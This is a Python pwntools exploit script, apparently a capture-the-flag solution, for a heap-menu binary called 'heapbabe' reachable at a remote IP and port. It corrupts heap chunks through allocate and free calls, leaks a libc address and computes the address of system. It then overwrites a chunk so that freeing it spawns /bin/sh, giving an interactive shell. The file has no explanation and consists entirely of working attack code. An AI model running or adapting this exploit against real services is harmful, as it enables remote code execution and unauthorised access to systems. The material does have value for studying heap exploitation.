from pwn import *

context.log_level='debug'

def Alloc(size,content):
	s.recvuntil('>> ')
	s.sendline('A')
	s.recvuntil('- size : ')
	s.sendline(str(size))
	if size <= 0x1000:
		s.recvuntil('- contents : ')
		s.sendline(content)

def Free(id):
        s.recvuntil('>> ')
        s.sendline('F')
	s.recvuntil('- id : ')
	s.sendline(str(id))
	s.recvuntil("Type 'DELETE' if you really want to free :")
	s.sendline('DELETE') #first index 0.

if __name__ == "__main__":

	#s=process('./heapbabe')
	s=remote('110.10.147.41', 8888)
	
	Alloc(0x28,'A'*0x28) #index 0
	Alloc(0x28,'B'*0x28) #index 1
	Alloc(0x28,'C'*0x28) #index 2
	Alloc(0x28,'D'*0x28) #index 3
	Alloc(0xf0,'a'*0xf0) #index 4
	Alloc(0xf0,'b'*0xf0) #index 5

	Free(0)
	Free(5)
	Free(1)

	Alloc(0xf8,'1'*0xf7+'\x00') #index 1
	Alloc(0x28,'2'*(0x18)+'\xb0\xd9'+'\x00') #Call puts in 1/16,Header chunk!! of index 5 Chunk

	Free(4)
	Free(1)

	Alloc(0x1000,'S'*(0x1000-1))
	
	Free(0)
	raw_input('1')
	Alloc(0x70,'!'*(0x6f)+'\x00')
	raw_input('2')
	Alloc(0x70,'@'*(0x6f)+'\x00')
	#Alloc(0x38,'#'*(0x37)+'\x00')

	Free(5)
	raw_input('end')
	print s.recv(1024)

	libc_leak=u64(s.recvuntil('\n'+'[').ljust(8,'\x00'))
	libc_leak=libc_leak-0x5b0a000000000000
	libc_base=libc_leak-0x3c4b78
	
	system=libc_base+0x45390 #local

        Alloc(0x28,'Q'*0x28) #index 0
        Alloc(0x28,'W'*0x28) #index 3
        Alloc(0xf0,'R'*0xf0) #index 5
	
	raw_input('final')

        Free(7)
        Free(5)
        Free(4)

        Alloc(0xf8,'1'*0xf7+'\x00') #index 1
        Alloc(0x28,'/bin/sh;'*(0x3)+p64(system)) #Header chunk!! of index 5 Chunk
	
	Free(7)	
	print "libc_leak: "+str(hex(libc_leak))
	print "libc_base: "+str(hex(libc_base))

	s.interactive()
